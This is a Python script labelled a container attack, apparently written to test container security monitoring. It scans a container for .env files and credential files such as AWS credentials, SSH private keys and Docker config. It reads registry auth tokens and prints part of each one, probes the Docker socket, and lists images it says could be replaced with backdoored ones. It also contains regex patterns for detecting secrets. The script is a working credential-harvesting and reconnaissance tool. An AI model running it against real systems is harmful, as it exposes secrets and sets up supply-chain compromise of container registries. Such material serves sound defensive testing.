#!/usr/bin/env python3
"""
Container Attack #7: Image & Registry Attacks
This is a CONTAINER-SPECIFIC attack targeting container images and registries

Attack Vector: Malicious container images, registry credential theft,
and supply chain attacks specific to containerized environments.
"""

import subprocess
import os
import json
import sys

def inspect_container_image():
    """
    Inspect current container image for vulnerabilities
    """
    print("[1] Inspecting container image...")
    print("    This is container-specific image analysis")
    print()
    
    # Get image information
    try:
        # Check if we're in a container
        if os.path.exists('/.dockerenv'):
            print("    [✓] Running in Docker container")
        
        # Try to get image info from environment
        hostname = os.environ.get('HOSTNAME', 'unknown')
        print(f"    Container ID: {hostname}")
        print()
        
    except Exception as e:
        print(f"    [!] {e}")
    print()

def search_for_secrets():
    """
    Search for secrets embedded in container image
    """
    print("[2] Searching for embedded secrets...")
    print("    Container images often contain hardcoded secrets")
    print()
    
    secret_patterns = [
        ('AWS Keys', r'AKIA[0-9A-Z]{16}'),
        ('Private Keys', r'-----BEGIN.*PRIVATE KEY-----'),
        ('Passwords', r'password\s*=\s*["\'].*["\']'),
        ('API Keys', r'api[_-]?key\s*=\s*["\'].*["\']'),
        ('Tokens', r'token\s*=\s*["\'].*["\']')
    ]
    
    # Search common locations
    search_paths = [
        '/app',
        '/root',
        '/home',
        '/etc',
        '/var/www'
    ]
    
    found_secrets = []
    
    for path in search_paths:
        if os.path.exists(path):
            try:
                # Search for .env files
                result = subprocess.run(
                    f"find {path} -name '.env' -o -name '*.env' 2>/dev/null | head -5",
                    shell=True,
                    capture_output=True,
                    text=True
                )
                
                if result.stdout.strip():
                    print(f"    [✓] Found .env files in {path}:")
                    for line in result.stdout.split('\n'):
                        if line.strip():
                            print(f"        {line}")
                            found_secrets.append(line)
            except:
                pass
    
    # Check for hardcoded credentials in common files
    credential_files = [
        '/root/.aws/credentials',
        '/root/.docker/config.json',
        '/root/.ssh/id_rsa',
        '/app/config.py',
        '/app/.env'
    ]
    
    print()
    print("    Checking for credential files:")
    for filepath in credential_files:
        if os.path.exists(filepath):
            print(f"    [✓] Found: {filepath}")
            found_secrets.append(filepath)
        else:
            print(f"    [✗] Not found: {filepath}")
    
    print()
    return found_secrets

def extract_registry_credentials():
    """
    Attempt to extract container registry credentials
    """
    print("[3] Extracting registry credentials...")
    print("    Registry credentials enable supply chain attacks")
    print()
    
    # Check Docker config
    docker_config_path = '/root/.docker/config.json'
    
    if os.path.exists(docker_config_path):
        print(f"    [✓] Found Docker config: {docker_config_path}")
        try:
            with open(docker_config_path, 'r') as f:
                config = json.load(f)
                
                if 'auths' in config:
                    print("    [✓] Registry credentials found:")
                    for registry, creds in config.get('auths', {}).items():
                        print(f"        Registry: {registry}")
                        if 'auth' in creds:
                            print(f"        Auth token: {creds['auth'][:20]}...")
                else:
                    print("    [!] No registry credentials in config")
        except Exception as e:
            print(f"    [!] {e}")
    else:
        print(f"    [✗] Docker config not found")
    
    print()

def analyze_image_layers():
    """
    Analyze container image layers for sensitive data
    """
    print("[4] Analyzing image layers...")
    print("    Image layers may contain deleted secrets")
    print()
    
    # Try to access Docker socket to inspect image
    if os.path.exists('/var/run/docker.sock'):
        print("    [✓] Docker socket accessible")
        print("    [!] Can inspect image layers")
        print("    [!] Can extract data from previous layers")
        
        try:
            # Get current container ID
            result = subprocess.run(
                "hostname",
                shell=True,
                capture_output=True,
                text=True
            )
            
            container_id = result.stdout.strip()
            print(f"    Container ID: {container_id}")
            
            # Try to inspect container
            inspect_result = subprocess.run(
                f"docker inspect {container_id} 2>/dev/null | head -20",
                shell=True,
                capture_output=True,
                text=True
            )
            
            if inspect_result.returncode == 0:
                print("    [✓] Can inspect container metadata")
        except:
            pass
    else:
        print("    [✗] Docker socket not accessible")
    
    print()

def malicious_image_deployment():
    """
    Demonstrate malicious image deployment capability
    """
    print("[5] Testing malicious image deployment...")
    print("    This is a supply chain attack vector")
    print()
    
    # Check if we can pull/push images
    if os.path.exists('/var/run/docker.sock'):
        print("    [✓] Can interact with Docker daemon")
        print("    [!] Could pull malicious images")
        print("    [!] Could push backdoored images")
        print("    [!] Could replace legitimate images")
        print()
        
        # List available images
        try:
            result = subprocess.run(
                "docker images --format '{{.Repository}}:{{.Tag}}' | head -10",
                shell=True,
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0 and result.stdout.strip():
                print("    Available images:")
                for line in result.stdout.split('\n')[:10]:
                    if line.strip():
                        print(f"        {line}")
        except:
            pass
    else:
        print("    [✗] Cannot interact with Docker daemon")
    
    print()

def check_image_vulnerabilities():
    """
    Check for known vulnerabilities in base image
    """
    print("[6] Checking for image vulnerabilities...")
    print("    Vulnerable base images are common")
    print()
    
    # Check OS version
    os_release_files = ['/etc/os-release', '/etc/lsb-release']
    
    for filepath in os_release_files:
        if os.path.exists(filepath):
            print(f"    [✓] Found: {filepath}")
            try:
                with open(filepath, 'r') as f:
                    content = f.read()
                    print("    OS Information:")
                    for line in content.split('\n')[:5]:
                        if line.strip():
                            print(f"        {line}")
            except:
                pass
            break
    
    print()
    
    # Check for outdated packages
    print("    [!] Checking for package managers...")
    package_managers = ['apt', 'yum', 'apk', 'dnf']
    
    for pm in package_managers:
        result = subprocess.run(
            f"which {pm}",
            shell=True,
            capture_output=True
        )
        
        if result.returncode == 0:
            print(f"    [✓] Found package manager: {pm}")
            print(f"    [!] Could install malicious packages")
    
    print()

def image_registry_attack():
    """
    Main image and registry attack orchestration
    """
    print("=" * 70)
    print("CONTAINER ATTACK: Image & Registry Exploitation")
    print("=" * 70)
    print()
    print("Attack Type: Supply Chain Attack")
    print("Target: Container Images & Registries")
    print("Severity: CRITICAL")
    print()
    
    # Inspect image
    inspect_container_image()
    
    # Search for secrets
    secrets = search_for_secrets()
    
    # Extract registry credentials
    extract_registry_credentials()
    
    # Analyze layers
    analyze_image_layers()
    
    # Malicious deployment
    malicious_image_deployment()
    
    # Check vulnerabilities
    check_image_vulnerabilities()
    
    print("=" * 70)
    print("ATTACK SUCCESSFUL: Image & Registry Exploitation")
    print("=" * 70)
    print()
    print("Impact:")
    print("- Discovered embedded secrets in image")
    print("- Extracted registry credentials")
    print("- Analyzed image layers for sensitive data")
    print("- Demonstrated malicious image deployment")
    print("- Identified vulnerable base images")
    print("- Supply chain compromise possible")
    print()
    print("- Docker socket usage")
    print("- Package manager execution")
    print("- Suspicious image operations")

if __name__ == "__main__":
    image_registry_attack()
